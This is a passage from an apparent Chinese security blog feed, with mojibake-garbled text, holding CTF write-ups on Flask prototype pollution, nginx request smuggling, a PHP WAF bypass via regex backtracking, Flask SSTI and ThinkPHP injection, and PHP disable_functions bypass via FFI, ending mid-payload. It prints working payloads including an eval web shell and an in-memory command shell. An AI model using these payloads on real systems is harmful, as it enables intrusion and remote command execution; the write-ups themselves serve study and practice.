src="/2024/11/19/python-flask-%E6%96%B0%E5%9E%8B%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5/IMG_20241120-214320084.png" class=""><br>ä½†æ˜¯è¦å®ç°ä¸Šé¢çš„payloadéœ€è¦å¯¼å…¥sys</p><p>ä½†æ­£å¸¸çš„flask app.pyæ–‡ä»¶å¹¶ä¸ä¼šå¯¼å…¥sys,ä½†æ˜¯å…¶webé¡µé¢ä¸€å®šä¼šå¯¼å…¥ä¸€äº›å…¶ä»–çš„æ¨¡å—<br>å‚è€ƒè¿™ç¯‡æ–‡ç« <a href="https://tttang.com/archive/1876/#toc_-_1">PythonåŸå‹é“¾æ±¡æŸ“å˜ä½“(prototype-pollution-in-python)</a>æˆ‘ä»¬å¯ä»¥çŸ¥é“æˆ‘ä»¬å¯ä»¥é€šè¿‡<br><code>&lt;æ¨¡å—å&gt;.__spec__.__init__.__globals__[&#39;sys&#39;]</code>è€Œè¿™ä¸ªæ¨¡å—åå¯ä»¥æ˜¯ä»»æ„çš„æ¨¡å—ã€‚<br>æˆ‘è¿™é‡Œå°±éšä¾¿å¯¼å…¥åº”è¯¥mathæ¨¡å—æ¥åšæ¼”ç¤º<br><img src="/2024/11/19/python-flask-%E6%96%B0%E5%9E%8B%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5/IMG_20241120-222444554.png" class=""><br>å³æˆ‘ä»¬åœ¨åŸå‹é“¾æ±¡æŸ“æ—¶å¯ä»¥é€šè¿‡å¦‚ä¸‹payloadæ¥è·å–sys</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;math&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__spec__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;sys&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;modules&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;werkzeug&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;exceptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                      <span class="attr">&quot;NotFound&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1263&quot;</span></span><br><span class="line">                      <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                  <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2024/11/19/python-flask-%E6%96%B0%E5%9E%8B%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5/IMG_20241120-222657833.png" class="">  <p>ç»“æœ<br><img src="/2024/11/19/python-flask-%E6%96%B0%E5%9E%8B%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5/IMG_20241120-230824088.png" class=""><br>æ‚²404é¡µé¢çš„å­—ç¬¦æ˜¯ç»è¿‡jinja2æ¨¡æ¿æ¸²æŸ“çš„å…¶ä¼šè‡ªåŠ¨urlå®ä½“åŒ–ç¼–ç <br>é‚£ä¹ˆè¿™æƒ³é€ æˆxsså°±ä¸æ˜¯ä¸€èˆ¬çš„éš¾äº†</p><p>æœ¬äººè¿˜æ˜¯tcläº†.å¸Œæœ›æœ‰å¤§ä½¬çœ‹åˆ°èƒ½å‘ŠçŸ¥ä¸€ä¸‹è¯¥å¦‚ä½•ç»§ç»­æ±¡æŸ“æ¥é€ æˆxss</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>èœ€é“å±±ctf</title>
      <link href="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/"/>
      <url>/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="æµ·å…³è­¦å¯Ÿè®­ç»ƒå¹³å°"><a href="#æµ·å…³è­¦å¯Ÿè®­ç»ƒå¹³å°" class="headerlink" title="æµ·å…³è­¦å¯Ÿè®­ç»ƒå¹³å°"></a>æµ·å…³è­¦å¯Ÿè®­ç»ƒå¹³å°</h2><p>æŸ¥çœ‹å…¶nginxç‰ˆæœ¬ä¸º1.17.60<br>æœç´¢å¯ä»¥å‘ç°è¯¥ç‰ˆæœ¬å¯ä»¥å‘ç°è¯¥ç‰ˆæœ¬å­˜åœ¨è¯·æ±‚èµ°ç§<br><img src="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/IMG_20241117-181425742.png" class=""><br>é¢˜ç›®åˆè¯´å…¶flagåœ¨<code>http://infernityhost/flag.html</code><br><img src="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/IMG_20241117-140531284.png" class=""><br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>gamebox.yunyansec.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">46</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /flag.html HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>:infernityhost</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length:<span class="number">15</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">kk</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">0s</span></span></span><br></pre></td></tr></table></figure><br><a href="https://szczecin.github.io/2024/05/21/CVE-2020-12440-Nginx/">ï¼ˆCVE-2020-12440ï¼‰Nginx &lt;= 1.8.0 è¯·æ±‚èµ°ç§</a></p><h2 id="å¥¶é¾™waf"><a href="#å¥¶é¾™waf" class="headerlink" title="å¥¶é¾™waf"></a>å¥¶é¾™waf</h2><img src="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/IMG_20241117-183016638.png" class="">  <p>é¦–å…ˆéœ€è¦ç»•è¿‡åç¼€æ£€æµ‹ï¼Œå› ä¸ºå…¶å°†GETä¼ å€¼çš„nameé€šè¿‡ <code>$fileExtension = strtolower(pathinfo($name, PATHINFO_EXTENSION));</code>æ¥è·å–æ–‡ä»¶ååç¼€é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨/.æ¥è¿›è¡Œç»•ç»•è¿‡<br><img src="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/IMG_20241117-182221893.png" class=""><br>çœ‹æºç ä¼šå‘ç°wafæ‹¦çš„å¾ˆæ­»,ä½†æ˜¯æˆ‘ä»¬åªè¦ä½¿å…¶æ£€æµ‹çš„ç»“æœä¸ºfalseå³å¯,é‚£ä¹ˆè¿™å°±å¯ä»¥æƒ³åˆ°ä½¿ç”¨æ­£åˆ™å›æº¯æ¥ç»•è¿‡</p><p>å¯ä»¥çœ‹åˆ°å…¶wafä¼šåŒ¹é…æ³¨é‡Šç¬¦ä¹‹é—´çš„å­—ç¬¦<br>é‚£ä¹ˆæˆ‘åªè¦åœ¨æ³¨é‡Šç¬¦ä¸­å¡100ä¸‡æ ¼aç„¶åå†åé¢å†™ä¸Šé©¬å³å¯ç»•è¿‡æ£€æµ‹å‘½ä»¤æ‰§è¡Œ<br><img src="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/IMG_20241117-182502610.png" class=""><br><img src="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/IMG_20241117-140608048.png" class=""><br><img src="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/IMG_20241117-140548022.png" class="">  </p><img src="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/IMG_20241117-140536862.png" class="">  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">file_path = <span class="string">&#x27;f.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¦å†™å…¥çš„å†…å®¹</span></span><br><span class="line">content = <span class="string">&#x27;/*&#x27;</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">1000003</span>+<span class="string">&quot;*/&quot;</span>+<span class="string">&quot;&lt;?php eval($_POST[&#x27;txt&#x27;]);&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™å…¥æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(content)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;å†…å®¹å·²å†™å…¥æ–‡ä»¶ï¼š<span class="subst">&#123;file_path&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="my-site"><a href="#my-site" class="headerlink" title="my_site"></a>my_site</h2><p>è¿™é¢˜æ˜¯èµ›åå¤ç°çš„ï¼Œæ‰“æ¯”èµ›çš„æ—¶å€™æ„Ÿè§‰é€»è¾‘å’Œæ€ªå°±æ²¡æœ‰å»å†™äº†ã€‚èµ›åå†ç¾¤é‡Œbaoå¸ˆå‚…è¯´å…¶å®å°±æ˜¯å•èº«æ¯çš„é‚£é¢˜æˆ‘å°±å»å¤ç°äº†ä¸€ä¸‹ã€‚å…¶å®éš¾åº¦è¿˜å¥½å°±æ˜¯è§¦å‘ç‚¹æ˜¯çœŸä¸å¥½æ‰¾<br>SSTIçš„æ´å°±æ˜¯å‡ºç°å†rot13è§£å¯†åè¾“å‡ºçš„åœ°æ–¹<br>ä½†baoå¸ˆå‚…å‡ºçš„SSTIæœ‰ç‚¹æ€ªæˆ‘ä¹Ÿæ²¡å¾€DSBCTFçš„é‚£é¢˜å»æƒ³ï¼Œæµ‹ä¸å‡ºæ¥å°±å»æåˆ«çš„é¢˜äº†ã€‚æµ‹äº†ä¸€ä¸‹<br>å¯ä»¥ä¹‹é—´æ‰“å†…å­˜é©¬</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for[<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;__bui&#x27;</span>+<span class="string">&#x27;ltins__&#x27;</span>][<span class="string">&quot;exec&quot;</span>](<span class="string">&quot;exc_class, code = __import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]._get_exc_class_and_code(404);__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].error_handler_spec[None][code][exc_class] = lambda err: __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;shell&#x27;)).read()&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for[<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;request&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><p>rot13ç¼–ç ååœ¨è§£å¯†å³å¯<br><img src="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/IMG_20241117-210212075.png" class=""><br><img src="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/IMG_20241117-210559692.png" class="">  </p><h2 id="æ¶æ„ä»£ç æ£€æµ‹"><a href="#æ¶æ„ä»£ç æ£€æµ‹" class="headerlink" title="æ¶æ„ä»£ç æ£€æµ‹"></a>æ¶æ„ä»£ç æ£€æµ‹</h2><img src="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/IMG_20241117-210642477.png" class="">  <p>ç€é¢˜åœ¨ä¸€å¼€å§‹çœ‹çš„æ—¶å€™å…¶å®æˆ‘å·²ç»å‘ç°äº†åœ¨ä¸è¾“å…¥é»‘åå•å†…å­—ç¬¦æ—¶ï¼Œå…¶å†…å®¹ä¼šè¢«åŒå¼•å·åŒ…è£¹ç„¶åå†™å…¥åˆ°æ–‡ä»¶é‡Œã€‚ä¹‹åå†è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œç€å°±å¯¼è‡´ä¸€ä¸ªé—®é¢˜æˆ‘ä»¬ã€‚å†åŒå¼•å·å†…å…¶å®æ˜¯å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„ã€‚<br>å¦‚ä¸‹</p><img src="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/IMG_20241117-211014756.png" class="">  <p>å†ç»è¿‡å°è¯•åä¹Ÿç¡®å®å‘ç°äº†ã€‚å¯ä»¥æ‰§è¡Œsleep(3)<br><img src="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/IMG_20241117-211533276.png" class=""><br>äºæ˜¯ä¸€å¼€å§‹æˆ‘åœ¨æœ¬åœ°å°è¯•æ„é€ payloadæ„é€ å‡ºäº†å¦‚ä¸‹payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="variable">$a</span>=sl&#125;$&#123;<span class="variable">$b</span>=eep&#125;$&#123;<span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$b</span>&#125;$&#123;<span class="variable">$c</span>(<span class="number">3</span>)&#125;</span><br></pre></td></tr></table></figure><br>è¿™ä¸ªè™½ç„¶åœ¨æœ¬åœ°è¿è¡ŒæˆåŠŸäº†<br>ä½†åœ¨è¿œç¨‹å¹¶æ²¡æœ‰è§¦å‘sleep(3) æ€€ç–‘æ˜¯å› ä¸ºtpæ¡†æ¶åœ¨ç¬¬ä¸€ä¸ª<code>$&#123;&#125;</code>å°±äº§ç”Ÿäº†ä¸€ä¸ªWarningç„¶åå°±åœæ­¢è¿è¡Œåé¢çš„äº†</p><p>æ¯”èµ›åçœ‹äº†wpå‘ç°ç«Ÿç„¶è¿˜èƒ½è¿™ä¹ˆç»•<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;input(0)(input(1))&#125;</span><br></pre></td></tr></table></figure><br>inputæ˜¯tpè·å–httpè¯·æ±‚çš„ä¸€ä¸ªå‡½æ•°ï¼Œåªèƒ½è¯´è¿˜æ˜¯å¯¹tpä¸å¤Ÿäº†è§£å§</p><img src="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/IMG_20241117-212054270.png" class="">  <p>æ¯”èµ›çš„æ—¶å€™æˆ‘ä¹Ÿå°±å¡åœ¨äº†è¿™ä¸ªçš„åœ°æ–¹</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ç¥å¥‡çš„ç¡¬å¸çººçº±æœº"><a href="#ç¥å¥‡çš„ç¡¬å¸çººçº±æœº" class="headerlink" title="ç¥å¥‡çš„ç¡¬å¸çººçº±æœº"></a>ç¥å¥‡çš„ç¡¬å¸çººçº±æœº</h2><p>å…¨è¾“0å°±å¥½äº†         </p><img src="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/IMG_20241117-154510968.png" class="">  <h2 id="golf"><a href="#golf" class="headerlink" title="golf"></a>golf</h2><p>pythonå¯ä»¥è§£ææ–œä½“å­—ç¬¦<br>ç›´æ¥åˆ©ç”¨unicodeæ–œä½“å­—ç¬¦æ¥ç»•å³å¯</p><img src="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/IMG_20241117-162705793.png" class="">  <img src="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/IMG_20241117-162713701.png" class="">  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(ğ‘“lag)</span><br></pre></td></tr></table></figure><h2 id="Elemental-Wars"><a href="#Elemental-Wars" class="headerlink" title="Elemental Wars"></a>Elemental Wars</h2><p>éšä¾¿è¾“æ€»ä¼šèµ¢çš„ã€‚<br><img src="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/IMG_20241117-163644449.png" class="">  </p><h2 id="æ¬¢è¿æ¥åˆ°2024èœ€é“å±±CTF"><a href="#æ¬¢è¿æ¥åˆ°2024èœ€é“å±±CTF" class="headerlink" title="æ¬¢è¿æ¥åˆ°2024èœ€é“å±±CTF"></a>æ¬¢è¿æ¥åˆ°2024èœ€é“å±±CTF</h2><img src="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/IMG_20241117-184509517.png" class="">  <h1 id="å¯†ç "><a href="#å¯†ç " class="headerlink" title="å¯†ç "></a>å¯†ç </h1><h2 id="xorrsa"><a href="#xorrsa" class="headerlink" title="xorrsa"></a>xorrsa</h2><ul><li>çœ‹é¢˜ç›®å¯èƒ½æ˜¯å’Œå¼‚æˆ–æœ‰å…³ï¼Œä½†æ˜¯æ‹¿åˆ°é™„ä»¶æŸ¥çœ‹å’Œå¼‚æˆ–æ²¡å•¥å…³ç³»ï¼Œqéƒ½å·²çŸ¥äº†ï¼Œnä¹ŸçŸ¥é“äº†ï¼Œeä¹ŸçŸ¥é“äº†ï¼Œç›´æ¥å¯ä»¥ç®€å•è®¡ç®—å‡ºæ¥äº†</li><li>è¿™é‡Œæœ¬è´¨ä¸Šæ˜¯è€ƒå¯Ÿeå’Œ<code>phi_n</code>ä¸äº’ç´ çš„æƒ…å†µ</li></ul><img src="/2024/11/17/%E8%9C%80%E9%81%93%E5%B1%B1ctf/image-20241117180943300.png" class="" title="image-20241117180943300"><ul><li><p>ç›´æ¥å°†<code>e//gcd(e,phi_n)</code>å’Œ<code>phi_n</code>çš„é€†å…ƒæ±‚å‡ºæ¥ï¼Œå°†mè®¡ç®—å‡ºæ¥ï¼Œæœ€åå°†må¼€<code>gcd(e,phi_n)</code>æ¬¡æ–¹å³å¯</p></li><li><p>expå¦‚ä¸‹ï¼š</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">13760578729891127041098229431259961120216468948795732373975536417751222443069805775693845560005881981622202089883866395577154701229046245882282127054969114210307175116574178428823043817041956207503299220721042136515863979655578210499512044917781566303947681251248645504273995402630701480590505840473412765662</span></span><br><span class="line">n = <span class="number">14247038211821385209759067256846232227444163173099199085257790370590450749665206556163364754269182255358084948354345827898987234756662133974633117062902370811855466665351784027125333112663075085395676501121759786699720149098576433141817737564928779420725539793335830274229206316999461309927000523188222801659</span></span><br><span class="line">hint1 = <span class="number">8938538619961731399716016665470564084986243880394928918482374295814509353382364651201249532111268951793354572124324033902502588541297713297622432670722730</span></span><br><span class="line">hint2 = <span class="number">1493298155243474837320092849325750387759519643879388609208314494000605554020636706320849032906759121914762492378489852575583260177546578935320977613050647</span></span><br><span class="line">e=<span class="number">2026</span></span><br><span class="line">p = n//hint2</span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(hint2-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="built_in">print</span>(gmpy2.gcd(e,phi_n))</span><br><span class="line">d = gmpy2.invert(e//<span class="number">2</span>,phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">m = libnum.nroot(m,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åˆ©ç”¨FFIæ¥ç»•è¿‡disable_functions</title>
      <link href="/2024/11/16/%E5%88%A9%E7%94%A8FFI%E6%9D%A5%E7%BB%95%E8%BF%87disable-functions/"/>
      <url>/2024/11/16/%E5%88%A9%E7%94%A8FFI%E6%9D%A5%E7%BB%95%E8%BF%87disable-functions/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿™ç¯‡æ–‡ç« è™½ç„¶å«åˆ©ç”¨FFIæ¥ç»•è¿‡disable-functionså…¶å®è¿˜æ˜¯æƒ³äº†è§£ä¸€ä¸‹phpçš„FFIï¼Œä¸»è¦æ˜¯åœ¨æ‰“å•èº«æ¯æ—¶é‡åˆ°äº†ï¼Œjavaçš„Nativeæ–¹æ³•æ¥æ‰§è¡Œsoæ–‡ä»¶å³æ‰§è¡ŒCè¯­è¨€ä»£ç ï¼Œä»è€Œç»•è¿‡Java-Security-Managerã€‚äºŒphpçš„FFIä¹Ÿæ˜¯phpè¿è¡Œå…¶ä»–è¯­è¨€ä»£ç çš„ä¸€ç§æ–¹æ³•"><a href="#è¿™ç¯‡æ–‡ç« è™½ç„¶å«åˆ©ç”¨FFIæ¥ç»•è¿‡disable-functionså…¶å®è¿˜æ˜¯æƒ³äº†è§£ä¸€ä¸‹phpçš„FFIï¼Œä¸»è¦æ˜¯åœ¨æ‰“å•èº«æ¯æ—¶é‡åˆ°äº†ï¼Œjavaçš„Nativeæ–¹æ³•æ¥æ‰§è¡Œsoæ–‡ä»¶å³æ‰§è¡ŒCè¯­è¨€ä»£ç ï¼Œä»è€Œç»•è¿‡Java-Security-Managerã€‚äºŒphpçš„FFIä¹Ÿæ˜¯phpè¿è¡Œå…¶ä»–è¯­è¨€ä»£ç çš„ä¸€ç§æ–¹æ³•" class="headerlink" title="è¿™ç¯‡æ–‡ç« è™½ç„¶å«åˆ©ç”¨FFIæ¥ç»•è¿‡disable_functionså…¶å®è¿˜æ˜¯æƒ³äº†è§£ä¸€ä¸‹phpçš„FFIï¼Œä¸»è¦æ˜¯åœ¨æ‰“å•èº«æ¯æ—¶é‡åˆ°äº†ï¼Œjavaçš„Nativeæ–¹æ³•æ¥æ‰§è¡Œsoæ–‡ä»¶å³æ‰§è¡ŒCè¯­è¨€ä»£ç ï¼Œä»è€Œç»•è¿‡Java Security Managerã€‚äºŒphpçš„FFIä¹Ÿæ˜¯phpè¿è¡Œå…¶ä»–è¯­è¨€ä»£ç çš„ä¸€ç§æ–¹æ³•"></a>è¿™ç¯‡æ–‡ç« è™½ç„¶å«åˆ©ç”¨FFIæ¥ç»•è¿‡disable_functionså…¶å®è¿˜æ˜¯æƒ³äº†è§£ä¸€ä¸‹phpçš„FFIï¼Œä¸»è¦æ˜¯åœ¨æ‰“å•èº«æ¯æ—¶é‡åˆ°äº†ï¼Œjavaçš„Nativeæ–¹æ³•æ¥æ‰§è¡Œsoæ–‡ä»¶å³æ‰§è¡ŒCè¯­è¨€ä»£ç ï¼Œä»è€Œç»•è¿‡Java Security Managerã€‚äºŒphpçš„FFIä¹Ÿæ˜¯phpè¿è¡Œå…¶ä»–è¯­è¨€ä»£ç çš„ä¸€ç§æ–¹æ³•</h1><h1 id="æå®¢å¤§æŒ‘æˆ˜-2020-Roamphp5-FighterFightsInvincibly"><a href="#æå®¢å¤§æŒ‘æˆ˜-2020-Roamphp5-FighterFightsInvincibly" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp5-FighterFightsInvincibly"></a>[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp5-FighterFightsInvincibly</h1><p>æ‰“å¼€æºç å¯ä»¥çœ‹åˆ°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_REQUEST</span>[<span class="string">&#x27;fighter&#x27;</span>](<span class="variable">$_REQUEST</span>[<span class="string">&#x27;fights&#x27;</span>],<span class="variable">$_REQUEST</span>[<span class="string">&#x27;invincibly&#x27;</span>]);</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨creat_functionæ³¨å…¥çš„æ–¹å¼æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fighter=create_function&amp;fights=&amp;invincibly=&#125;;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*</span></span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬æŸ¥çœ‹å…¶disable_functions<br>å¯ä»¥å‘ç°å…¶å‡ ä¹å°†èƒ½å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°éƒ½ç¦äº†ä¸€é<br><img src="/2024/11/16/%E5%88%A9%E7%94%A8FFI%E6%9D%A5%E7%BB%95%E8%BF%87disable-functions/IMG_20241116-220324133.png" class=""><br><img src="/2024/11/16/%E5%88%A9%E7%94%A8FFI%E6%9D%A5%E7%BB%95%E8%BF%87disable-functions/IMG_20241116-220841641.png" class=""><br>è¯•äº†ä¸€ä¸‹å¯ä»¥æ‹¿èšå‰‘ç»•â€¦ä½†è¿™éƒ½ä¸æ˜¯é—®é¢˜<br>èšå‰‘çš„FFIç«Ÿç„¶ç»•ä¸è¿‡ï¼Œæˆ‘ä»¬å°±æ‰‹åŠ¨ç”¨FFIæ¥ç»•<br>æˆ‘ä»¬æ—¢ç„¶è¦å›æ˜¾å†…å®¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°ä¸€ä¸ªcè¯­è¨€å‡½æ•°å¯ä»¥è¿”å›çš„å†…å®¹ä¸ºå‘½ä»¤æ‰§è¡Œçš„ç»“æœï¼Œ<br><img src="/2024/11/16/%E5%88%A9%E7%94%A8FFI%E6%9D%A5%E7%BB%95%E8%BF%87disable-functions/IMG_20241116-221214537.png" class=""><br><br>AIç»™å‡ºäº†ä¸€äº›æ–¹æ³•ï¼Œæˆ‘ä»¬è¿™é‡Œå°±ç”¨popenåŠ fgetcçš„æ–¹æ³•æ¥å°†æˆ‘ä»¬çš„å†…å®¹è¾“å‡º<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ffi</span>+%<span class="number">3</span>d+FFI%<span class="number">3</span>a%<span class="number">3</span>acdef(<span class="string">&quot;void+*popen(char*,char*)%3b+int+fgetc(void*)%3b+void+pclose(void*)%3b&quot;</span>,+<span class="string">&quot;libc.so.6&quot;</span>)%<span class="number">3</span>b<span class="variable">$b</span>%<span class="number">3</span>d<span 